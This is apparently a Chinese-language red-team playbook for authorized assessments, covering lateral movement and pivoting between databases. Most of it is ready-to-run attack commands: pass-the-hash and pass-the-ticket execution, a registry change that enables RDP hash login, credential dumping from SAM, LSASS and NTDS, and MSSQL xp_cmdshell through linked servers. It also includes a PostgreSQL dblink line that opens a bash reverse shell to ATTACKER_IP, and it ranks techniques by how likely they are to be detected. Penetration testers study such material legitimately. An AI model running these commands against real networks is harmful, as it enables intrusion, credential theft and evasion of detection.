# 横向移动与跨库跳板

> 适用：已持有明文/哈希/票据/证书，需要按最少痕迹选一条从当前主机到下一台主机（含数据库到数据库）的路径的授权评估。

## 认什么

| 手里的材料 | 首选 | 备选/限制 |
|---|---|---|
| 明文口令 | WinRM(5985/5986) → WMI(135+445) → PSExec(445) | Linux 走 SSH(22)；图形界面才用 RDP(3389) |
| NT hash | PTH：wmiexec/smbexec/psexec/evil-winrm | RDP 需 Restricted Admin |
| Kerberos 票据 | PTT：impacket `-k -no-pass`、`evil-winrm -r` | 必须用 FQDN，不能 IP |
| 证书 | 先换 TGT，或 Schannel/PassTheCert | 无 PKINIT 时降级 |
| 数据库 | PG dblink/postgres_fdw、MSSQL Linked Server/OPENROWSET、MySQL FEDERATED | 需 superuser/sa 级 |
| 跳板 | 双网卡主机、可写共享、SSH 密钥 | 注意私钥权限 600 |

`netexec` 输出 `(Pwn3d!)` = 该账户对目标有管理员权限，可远程执行并提凭据；只有 `[+]` 则仅凭据有效。

检测风险从低到高（按检测风险排序）：wmiexec < smbexec < atexec < dcomexec < evil-winrm < psexec。
端口：psexec/smbexec/atexec=445；wmiexec/dcomexec=135+动态+445；WinRM=5985/5986；RDP=3389。

## 打哪（命令）

**先发现**

```bash
arp -a
naabu -host 10.0.0.0/24 -p 22,80,135,445,3389,5985 -silent
netexec smb CIDR -u USER -p PASS --shares
```

**PTH 与远程执行**

```bash
impacket-wmiexec -hashes ':<NT_HASH>' 'DOMAIN/USER@TARGET'
impacket-smbexec -hashes ':<NT_HASH>' 'DOMAIN/USER@TARGET'
impacket-psexec -hashes ':<NT_HASH>' 'DOMAIN/USER@TARGET'
impacket-atexec -hashes ':<NT_HASH>' 'DOMAIN/USER@TARGET' 'whoami'
impacket-dcomexec -hashes ':<NT_HASH>' 'DOMAIN/USER@TARGET' -object MMC20
evil-winrm -i TARGET -u USER -H NT_HASH
netexec smb TARGET -u USER -p PASS -x 'whoami'
# RDP 摘 PTH：先确认/启用 Restricted Admin
impacket-reg 'DOMAIN/USER@TARGET' -hashes ':<NT_HASH>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
xfreerdp /u:USER /d:DOMAIN /pth:HASH /v:TARGET /cert-ignore
```

**PTT 与 Overpass-the-Hash**

```bash
export KRB5CCNAME=ticket.ccache ; klist -c ticket.ccache
impacket-wmiexec -k -no-pass 'DOMAIN/USER@TARGET_FQDN'
impacket-secretsdump -k -no-pass 'TARGET_FQDN'
impacket-ticketConverter in.kirbi out.ccache
impacket-getTGT -hashes ':<NT_HASH>' 'DOMAIN/USER'     # Overpass，之后同样 -k
ntpdate DC_IP                                          # KRB_AP_ERR_SKEW 时
```

**跨库横向（追隔离的关键路径）**

```sql
-- PostgreSQL：dblink 建连、查版本、跨库执行
SELECT dblink_connect('lateral','host=10.0.0.2 port=5432 user=postgres password=postgres dbname=postgres sslmode=disable');
SELECT * FROM dblink('lateral','SELECT version()') AS t(result TEXT);
SELECT dblink_exec('lateral',$$COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'$$);
SELECT dblink_disconnect('lateral');
-- MSSQL：Linked Server 与即席查询
EXEC sp_linkedservers;
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME],'SELECT @@servername');
EXEC ('xp_cmdshell ''whoami''') AT [REMOTE];
-- MySQL
SHOW ENGINES;
```

```sql
-- 端口探测：connect_timeout 判开放（快速报错=开，等待超时=关）
SELECT dblink_connect('probe','host=10.0.0.1 port=80 user=x password=x dbname=x connect_timeout=3');
```

**落地后提凭据**

```bash
impacket-secretsdump DOMAIN/ADMIN:PASS@TARGET
lsassy -d DOMAIN -u USER -p PASS TARGET
donpapi DOMAIN/USER:PASSWORD@TARGET
pypykatz lsa minidump lsass.dmp
gpp-decrypt "ENCRYPTED_CPASSWORD"
```

## 什么算成

- `netexec` 对目标显示 `(Pwn3d!)`，且 `-x 'whoami'` 回显目标身份
- wmiexec/smbexec 有命令回显；`secretsdump` 落出 SAM/LSASS/NTDS 的 hash
- PTT：`klist` 显示票据在有效期内，且 `-k -no-pass` 能读共享或导 hash
- 跨库：dblink 返回远端 `version()` 或业务表数据；`OPENQUERY` 返回远端 `@@servername`；`EXEC ... AT` 有命令输出
- 从数据库连接串/配置表捞到的新凭据能在下一跳认证成功

## 假点

- PTH 成功但只有 `[+]`：能读共享不能执行，别当"拿到主机"
- 票据有效却连 IP：`Server not found in Kerberos database`，是 DNS/FQDN 问题；时差 >5 分钟报 `KRB_AP_ERR_SKEW`
- PTH 在 Kerberos-only 或开 Credential Guard 的主机上失效，改 Overpass/PTT，这不是"凭据错"
- dblink 建不起来：非 superuser 通常不能 `CREATE EXTENSION`；`pg_available_extensions` 有记录也不代表能装
- `sp_linkedservers` 有记录但 `EXEC ... AT` 失败：`rpc out` 未开（`sp_serveroption @server='REMOTE', @optname='rpc out', @optvalue='true'`）
- dblink 连不上 ≠ 目标不存在：可能不是 PG 或端口不对；用 `connect_timeout` 区分端口开（快速报错）与关（超时）
- 跨库流量的源 IP 是**数据库服务器**而不是攻击机：ACL 绕过是真的，但日志归属别判错
- 数据库跨库查询留审计日志，大批量扫表在受限环境很显眼（注意操作节制）
- `-c "whoami"` 无回显但进程已起：远程执行成不成看回包，别把超时当成功

## 与其他包联动

- 材料来源：hash 来自 `internal-04`，票据来自 `internal-02`，服务票据/证书来自 `internal-03`，目标清单来自 `internal-01`
- 跨网段位移见 `internal-06`；Exchange/SCCM/OA/数据库默认弱点见 `internal-09`；数据库注入入口见 `web-injection`
- 报告口径按 `../../../../rules/40-evidence-report.md`（匿名闸/认钥闸/三档定级）
